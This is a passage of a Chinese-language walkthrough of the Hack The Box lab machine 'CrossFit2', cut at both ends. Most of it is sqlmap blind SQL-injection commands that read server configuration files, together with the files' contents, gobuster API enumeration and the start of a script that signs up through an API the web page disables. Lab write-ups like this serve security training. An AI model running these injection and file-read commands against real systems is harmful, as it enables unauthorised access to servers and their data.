class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/etc/login.conf"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="variable">$OpenBSD</span>: login.conf,v 1.16 2020/06/23 15:45:34 naddy Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Sample login.conf file.  See login.conf(5) <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Standard authentication styles:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> passwd	Use only the <span class="built_in">local</span> password file</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chpass	Do not authenticate, but change user<span class="string">'s password (change</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">		the YP password <span class="keyword">if</span> the user has one, <span class="keyword">else</span> change the</span></span><br><span class="line"><span class="meta">#</span><span class="bash">		<span class="built_in">local</span> password)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lchpass	Do not login; change user<span class="string">'s local password instead</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> radius	Use radius authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> reject	Use rejected authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> skey		Use S/Key authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> activ		ActivCard X9.9 token authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> crypto	CRYPTOCard X9.9 token authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> snk		Digital Pathways SecureNet Key authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tis		TIS Firewall Toolkit authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> token		Generic X9.9 token authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yubikey	YubiKey authentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default allowed authentication styles</span></span><br><span class="line">auth-defaults:auth=passwd,skey:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default allowed authentication styles <span class="keyword">for</span> authentication <span class="built_in">type</span> ftp</span></span><br><span class="line">auth-ftp-defaults:auth-ftp=passwd:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default values</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To alter the default authentication types change the line:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	:tc=auth-defaults:\</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to <span class="built_in">read</span> something like: (enables passwd, <span class="string">"myauth"</span>, and activ)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	:auth=passwd,myauth,activ:\</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Any value changed <span class="keyword">in</span> the daemon class should be reset <span class="keyword">in</span> default</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> class.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">default:\</span><br><span class="line">	:path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\</span><br><span class="line">	:umask=022:\</span><br><span class="line">	:datasize-max=768M:\</span><br><span class="line">	:datasize-cur=768M:\</span><br><span class="line">	:maxproc-max=256:\</span><br><span class="line">	:maxproc-cur=128:\</span><br><span class="line">	:openfiles-max=102400:\</span><br><span class="line">	:openfiles-cur=102400:\</span><br><span class="line">	:stacksize-cur=4M:\</span><br><span class="line">	:localcipher=blowfish,a:\</span><br><span class="line">	:tc=auth-defaults:\</span><br><span class="line">	:tc=auth-ftp-defaults:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Settings used by /etc/rc and root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This must be <span class="built_in">set</span> properly <span class="keyword">for</span> daemons started as root by inetd as well.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Be sure to reset these values to system defaults <span class="keyword">in</span> the default class!</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">daemon:\</span><br><span class="line">	:ignorenologin:\</span><br><span class="line">	:datasize=infinity:\</span><br><span class="line">	:maxproc=infinity:\</span><br><span class="line">	:openfiles-max=102400:\</span><br><span class="line">	:openfiles-cur=102400:\</span><br><span class="line">	:stacksize-cur=8M:\</span><br><span class="line">	:auth-ssh=yubikey:\</span><br><span class="line">	:auth-su=reject:\</span><br><span class="line">	:tc=default:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Staff have fewer restrictions and can login even when nologins are <span class="built_in">set</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">staff:\</span><br><span class="line">	:datasize-cur=1536M:\</span><br><span class="line">	:datasize-max=infinity:\</span><br><span class="line">	:maxproc-max=512:\</span><br><span class="line">	:maxproc-cur=256:\</span><br><span class="line">	:ignorenologin:\</span><br><span class="line">	:requirehome@:\</span><br><span class="line">	:tc=default:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authpf accounts get a special motd and shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">authpf:\</span><br><span class="line">	:welcome=/etc/motd.authpf:\</span><br><span class="line">	:shell=/usr/sbin/authpf:\</span><br><span class="line">	:tc=default:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Building ports with DPB uses raised limits</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">pbuild:\</span><br><span class="line">	:datasize-max=infinity:\</span><br><span class="line">	:datasize-cur=8192M:\</span><br><span class="line">	:maxproc-max=1024:\</span><br><span class="line">	:maxproc-cur=384:\</span><br><span class="line">	:priority=5:\</span><br><span class="line">	:tc=default:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Override resource limits <span class="keyword">for</span> certain daemons started by rc.d(8)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">bgpd:\</span><br><span class="line">	:openfiles=512:\</span><br><span class="line">	:tc=daemon:</span><br><span class="line"></span><br><span class="line">unbound:\</span><br><span class="line">	:openfiles=512:\</span><br><span class="line">	:tc=daemon:</span><br></pre></td></tr></table></figure>

<h2 id="etc-ssh-sshd-config"><a href="#etc-ssh-sshd-config" class="headerlink" title="/etc/ssh/sshd_config"></a>/etc/ssh/sshd_config</h2><p>root需要公钥和密码，非root需要密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/etc/ssh/sshd_config"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">	<span class="variable">$OpenBSD</span>: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the sshd server system-wide configuration file.  See</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshd_config(5) <span class="keyword">for</span> more information.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The strategy used <span class="keyword">for</span> options <span class="keyword">in</span> the default sshd_config shipped with</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenSSH is to specify options with their default value <span class="built_in">where</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> possible, but leave them commented.  Uncommented options override the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default value.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Port 22</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress ::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_rsa_key</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_ecdsa_key</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_ed25519_key</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ciphers and keying</span></span><br><span class="line"><span class="meta">#</span><span class="bash">RekeyLimit default none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SyslogFacility AUTH</span></span><br><span class="line"><span class="meta">#</span><span class="bash">LogLevel INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LoginGraceTime 2m</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="bash">StrictModes yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxAuthTries 6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxSessions 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">PubkeyAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> but this is overridden so installations will only check .ssh/authorized_keys</span></span><br><span class="line">AuthorizedKeysFile	.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedPrincipalsFile none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommand none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommandUser nobody</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For this to work you will also need host keys <span class="keyword">in</span> /etc/ssh/ssh_known_hosts</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostbasedAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to yes <span class="keyword">if</span> you don<span class="string">'t trust ~/.ssh/known_hosts for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HostbasedAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreUserKnownHosts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">'t read the user'</span>s ~/.rhosts and ~/.shosts files</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreRhosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">disable</span> tunneled clear text passwords, change to no here!</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PasswordAuthentication yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitEmptyPasswords no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> s/key passwords</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChallengeResponseAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowAgentForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowTcpForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GatewayPorts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11DisplayOffset 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11UseLocalhost yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTTY yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintMotd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintLastLog yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TCPKeepAlive yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitUserEnvironment no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Compression delayed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseDNS no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PidFile /var/run/sshd.pid</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxStartups 10:30:100</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTunnel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChrootDirectory none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VersionAddendum none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no default banner path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Banner none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> override default of no subsystems</span></span><br><span class="line">Subsystem	sftp	/usr/libexec/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Match User anoncvs</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	AllowTcpForwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	PermitTTY no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	ForceCommand cvs server</span></span><br><span class="line"></span><br><span class="line">Match User root</span><br><span class="line">	AuthenticationMethods publickey,password</span><br><span class="line">Match User *,!root</span><br><span class="line">	AuthenticationMethods password</span><br></pre></td></tr></table></figure>

<h2 id="etc-httpd-conf"><a href="#etc-httpd-conf" class="headerlink" title="/etc/httpd.conf"></a>/etc/httpd.conf</h2><p>根据配置文件，除了chat和employees还有其他的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/etc/httpd.conf"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="variable">$OpenBSD</span>: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">types &#123;</span><br><span class="line">    include "/usr/share/misc/mime.types"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server "0.0.0.0" &#123;</span><br><span class="line">        no log</span><br><span class="line">        listen on lo0 port 8000</span><br><span class="line"></span><br><span class="line">        root "/htdocs"</span><br><span class="line">        directory index index.php</span><br><span class="line"></span><br><span class="line">        location "*.php*" &#123;</span><br><span class="line">                fastcgi socket "/run/php-fpm.sock"</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server "employees" &#123;</span><br><span class="line">        no log</span><br><span class="line">        listen on lo0 port 8001</span><br><span class="line"></span><br><span class="line">        root "/htdocs_employees"</span><br><span class="line">        directory index index.php</span><br><span class="line"></span><br><span class="line">        location "*.php*" &#123;</span><br><span class="line">                fastcgi socket "/run/php-fpm.sock"</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server "chat" &#123;</span><br><span class="line">        no log</span><br><span class="line">        listen on lo0 port 8002</span><br><span class="line"></span><br><span class="line">        root "/htdocs_chat"</span><br><span class="line">        directory index index.html</span><br><span class="line"></span><br><span class="line">        location match "^/home$" &#123;</span><br><span class="line">            request rewrite "/index.html"</span><br><span class="line">        &#125;</span><br><span class="line">        location match "^/login$" &#123;</span><br><span class="line">            request rewrite "/index.html"</span><br><span class="line">        &#125;</span><br><span class="line">        location match "^/chat$" &#123;</span><br><span class="line">            request rewrite "/index.html"</span><br><span class="line">        &#125;</span><br><span class="line">        location match "^/favicon.ico$" &#123;</span><br><span class="line">            request rewrite "/images/cross.png"</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="etc-relayd-conf"><a href="#etc-relayd-conf" class="headerlink" title="/etc/relayd.conf"></a>/etc/relayd.conf</h2><p>得到crossfit-club.htb，加hosts：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/etc/relayd.conf"</span><br><span class="line"></span><br><span class="line">table&lt;1&gt;&#123;127.0.0.1&#125;</span><br><span class="line">table&lt;2&gt;&#123;127.0.0.1&#125;</span><br><span class="line">table&lt;3&gt;&#123;127.0.0.1&#125;</span><br><span class="line">table&lt;4&gt;&#123;127.0.0.1&#125;</span><br><span class="line">http protocol web&#123;</span><br><span class="line">        pass request quick header "Host" value "*crossfit-club.htb" forward to &lt;3&gt;</span><br><span class="line">        pass request quick header "Host" value "*employees.crossfit.htb" forward to &lt;2&gt;</span><br><span class="line">        match request path "/*" forward to &lt;1&gt;</span><br><span class="line">        match request path "/ws*" forward to &lt;4&gt;</span><br><span class="line">        http websockets</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table&lt;5&gt;&#123;127.0.0.1&#125;</span><br><span class="line">table&lt;6&gt;&#123;127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4&#125;</span><br><span class="line">http protocol portal&#123;</span><br><span class="line">        pass request quick path "/" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/index.html" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/home" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/login" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/chat" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/js/*" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/css/*" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/fonts/*" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/images/*" forward to &lt;5&gt;</span><br><span class="line">        pass request quick path "/favicon.ico" forward to &lt;5&gt;</span><br><span class="line">        pass forward to &lt;6&gt;</span><br><span class="line">        http websockets</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">relay web&#123;</span><br><span class="line">        listen on "0.0.0.0" port 80</span><br><span class="line">        protocol web</span><br><span class="line">        forward to &lt;1&gt; port 8000</span><br><span class="line">        forward to &lt;2&gt; port 8001</span><br><span class="line">        forward to &lt;3&gt; port 9999</span><br><span class="line">        forward to &lt;4&gt; port 4419</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">relay portal&#123;</span><br><span class="line">        listen on 127.0.0.1 port 9999</span><br><span class="line">        protocol portal</span><br><span class="line">        forward to &lt;5&gt; port 8002</span><br><span class="line">        forward to &lt;6&gt; port 5000 mode source-hash</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="crossfit-club-htb"><a href="#crossfit-club-htb" class="headerlink" title="crossfit-club.htb"></a>crossfit-club.htb</h1><p>另一个需要登录的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051112.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="api-enum"><a href="#api-enum" class="headerlink" title="api enum"></a>api enum</h2><p>查看流量发现/api/auth，那就枚举其他api：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051113.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/</span><br><span class="line"></span><br><span class="line">http://crossfit-club.htb/api/auth                 (Status: 200) [Size: 66]</span><br><span class="line">http://crossfit-club.htb/api/ping                 (Status: 200) [Size: 71]</span><br><span class="line"></span><br><span class="line">gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/</span><br><span class="line"></span><br><span class="line">http://crossfit-club.htb/api/Login                (Status: 200) [Size: 50]</span><br><span class="line">http://crossfit-club.htb/api/login                (Status: 200) [Size: 50]</span><br><span class="line">http://crossfit-club.htb/api/signup               (Status: 200) [Size: 50]</span><br></pre></td></tr></table></figure>

<h2 id="signup"><a href="#signup" class="headerlink" title="signup"></a>signup</h2><p>api里发现signup,网页的signup是禁用，尝试直接通过api：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051114.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>响应只有管理员可以添加用户，无法注册：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051115.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="signup-sh"><a href="#signup-sh" class="headerlink" title="signup.sh"></a>signup.sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RHOST=<span class="string">"crossfit-club.htb"</span></span><br><span class="line">RPORT=80</span><br><span class="line">USER=<span class="string">"miao"</span></span><br><span class="line">PASS=<span class="string">'miao@123'</span></span><br><span class="line">EMAIL=<span class="string">"miao@crossfit.htb"</span></span><br><span class="line">COOKIE=<span class="string">"<span class="variable">$(mktemp -u)</span>"</span></span><br><span class="line">PROXY=<span class="string">"127.0.0.1:8087"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get CSRF token</span></span><br><span class="line">TOKEN=$(curl -s \</span><br><span class="line">             -c <span class="string">"<span class="variable">$&#123;COOKIE&#125;</span>"</span> \</span><br><span class="line">             -x <span class="string">"<span class="variable">$&#123;PROXY&#125;</span>"</span> \</span><br><span class="line">             <span class="string">"http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/api/auth"</span> \</span><br><span class="line">        | jq .token 